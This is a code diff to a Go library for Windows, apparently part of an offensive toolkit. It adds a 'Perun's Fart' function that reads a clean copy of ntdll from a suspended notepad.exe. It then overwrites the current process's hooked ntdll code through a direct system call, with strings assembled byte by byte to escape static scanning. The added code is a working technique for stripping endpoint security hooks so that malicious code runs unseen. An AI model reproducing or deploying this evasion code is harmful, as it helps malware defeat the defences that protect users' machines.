@@ -20,24 +20,6 @@ import (
 	"golang.org/x/sys/windows"
 )
 
-const (
-	MEM_COMMIT  = 0x001000
-	MEM_RESERVE = 0x002000
-	IDX         = 32
-)
-
-type unNtd struct {
-	pModule uintptr
-	size    uintptr
-}
-
-// Library - describes a loaded library
-type Library struct {
-	Name        string
-	BaseAddress uintptr
-	Exports     map[string]uint64
-}
-
 func (l *Library) UniversalFindProc(funcname string) (uintptr, error) {
 	v, ok := l.Exports[strings.ToLower(funcname)]
 	if !ok {
@@ -514,6 +496,170 @@ func npvm(sysid uint16, processHandle uintptr, baseAddress, regionSize *uintptr,
 		NewProtect,
 		uintptr(unsafe.Pointer(oldprotect)),
 	)
+}
+
+//Perun's Fart unhook function
+//todo: change syscall package into gabh
+func PerunsFart() error {
+
+	//get customsyscall
+	//todo: change registry ops into syscall
+	var customsyscall uint16
+	regkey, _ := registry.OpenKey(registry.LOCAL_MACHINE, string([]byte{'S', 'O', 'F', 'T', 'W', 'A', 'R', 'E', '\\', 'M', 'i', 'c', 'r', 'o', 's', 'o', 'f', 't', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', ' ', 'N', 'T', '\\', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'V', 'e', 'r', 's', 'i', 'o', 'n'}), registry.QUERY_VALUE)
+	CurrentVersion, _, _ := regkey.GetStringValue(string([]byte{'C', 'u', 'r', 'r', 'e', 'n', 't', 'V', 'e', 'r', 's', 'i', 'o', 'n'}))
+	MajorVersion, _, err := regkey.GetIntegerValue(string([]byte{'C', 'u', 'r', 'r', 'e', 'n', 't', 'M', 'a', 'j', 'o', 'r', 'V', 'e', 'r', 's', 'i', 'o', 'n', 'N', 'u', 'm', 'b', 'e', 'r'}))
+	if err == nil {
+		MinorVersion, _, _ := regkey.GetIntegerValue(string([]byte{'C', 'u', 'r', 'r', 'e', 'n', 't', 'M', 'i', 'n', 'o', 'r', 'V', 'e', 'r', 's', 'i', 'o', 'n', 'N', 'u', 'm', 'b', 'e', 'r'}))
+		CurrentVersion = strconv.FormatUint(MajorVersion, 10) + "." + strconv.FormatUint(MinorVersion, 10)
+	}
+	regkey.Close()
+
+	if CurrentVersion == "10.0" {
+		customsyscall = 0x50
+	} else {
+		return fmt.Errorf("winver low")
+	}
+
+	//create suspended new process
+	var si syscall.StartupInfo
+	var pi syscall.ProcessInformation
+	si.Cb = uint32(unsafe.Sizeof(syscall.StartupInfo{}))
+
+	target := "C:\\Windows\\System32\\notepad.exe"
+	//target := os.args[0]
+
+	cmdline, err := syscall.UTF16PtrFromString(target)
+	if err != nil {
+		panic(err)
+	}
+
+	err = syscall.CreateProcess(
+		nil,
+		cmdline,
+		nil,
+		nil,
+		false,
+		windows.CREATE_SUSPENDED,
+		nil,
+		nil,
+		&si,
+		&pi)
+
+	if err != nil {
+		return err
+	}
+
+	fmt.Println("Start Suspended Notepad.exe and Sleep 5s pid: " + strconv.Itoa(int(pi.ProcessId)))
+
+	windows.SleepEx(5000, false)
+
+	//get ntdll handler
+	GetModuleHandleA := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2'})).NewProc("GetModuleHandleA")
+	bytes0 := []byte(string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}))
+	Ntdll, _, _ := GetModuleHandleA.Call(uintptr(unsafe.Pointer(&bytes0[0])))
+	if Ntdll == 0 {
+		return fmt.Errorf("err GetModuleHandleA")
+	}
+
+	moduleInfo := windows.ModuleInfo{}
+
+	curr, _ := syscall.GetCurrentProcess()
+	if curr == 0 {
+		return fmt.Errorf("err GetCurrentProcess")
+	}
+
+	err = windows.GetModuleInformation(windows.Handle(uintptr(curr)), windows.Handle(Ntdll), &moduleInfo, uint32(unsafe.Sizeof(moduleInfo)))
+	if err != nil {
+		return err
+	}
+
+	addrMod := moduleInfo.BaseOfDll
+
+	//get ntheader of ntdll
+	ntHeader := ntH(addrMod)
+	if ntHeader == nil {
+		return fmt.Errorf("get ntHeader err")
+	}
+
+	windows.SleepEx(50, false)
+
+	//get module size of ntdll
+	modSize := ntHeader.OptionalHeader.SizeOfImage
+	if modSize == 0 {
+		return fmt.Errorf("get module size err")
+	}
+	//fmt.Println("ntdll module size: " + strconv.Itoa(int(modSize)))
+
+	cache := make([]byte, modSize)
+
+	//read clean ntdll from new process
+	//todo: change readprocessmemory into Nt api
+	err = windows.ReadProcessMemory(windows.Handle(uintptr(pi.Process)), addrMod, &cache[0], uintptr(modSize), nil)
+	if err != nil {
+		return err
+	}
+	e := syscall.TerminateProcess(pi.Process, 0)
+	if e != nil {
+		return e
+	}
+
+	fmt.Println("Terminate Suspended Process...")
+
+	windows.SleepEx(50, false)
+
+	dll := cache
+	if err != nil {
+		return err
+	}
+
+	//parsing buff into pe format
+	file, error1 := pe.NewFileFromMemory(bytes.NewReader(cache))
+	if error1 != nil {
+		return error1
+	}
+
+	//check out the .text section offset
+	x := file.Section(string([]byte{'.', 't', 'e', 'x', 't'}))
+	bytes := dll[x.Offset:x.Size]
+	dllBase := Ntdll
+	dllOffset := uint(dllBase) + uint(x.VirtualAddress)
+	var oldfartcodeperms uintptr
+	regionsize := uintptr(len(bytes))
+	handlez := uintptr(0xffffffffffffffff)
+
+	runfunc, _ := npvm(
+		customsyscall,
+		handlez,
+		(*uintptr)(unsafe.Pointer(&dllOffset)),
+		&regionsize,
+		syscall.PAGE_EXECUTE_READWRITE,
+		&oldfartcodeperms,
+	)
+	if runfunc != 0 {
+	}
+
+	for i := 0; i < len(bytes); i++ {
+		loc := uintptr(dllOffset + uint(i))
+		mem := (*[1]byte)(unsafe.Pointer(loc))
+		(*mem)[0] = bytes[i]
+	}
+	//fmt.Println("Unhooked Ntdll...")
+
+	runfunc, _ = npvm(
+		customsyscall,
+		handlez,
+		(*uintptr)(unsafe.Pointer(&dllOffset)),
+		&regionsize,
+		oldfartcodeperms,
+		&oldfartcodeperms,
+	)
+	if runfunc != 0 {
+	}
+	return nil
+}
+
+func ntH(baseAddress uintptr) *IMAGE_NT_HEADERS {
+	return (*IMAGE_NT_HEADERS)(unsafe.Pointer(baseAddress + uintptr((*IMAGE_DOS_HEADER)(unsafe.Pointer(baseAddress)).E_lfanew)))
 }
 
 func str2sha1(s string) string {
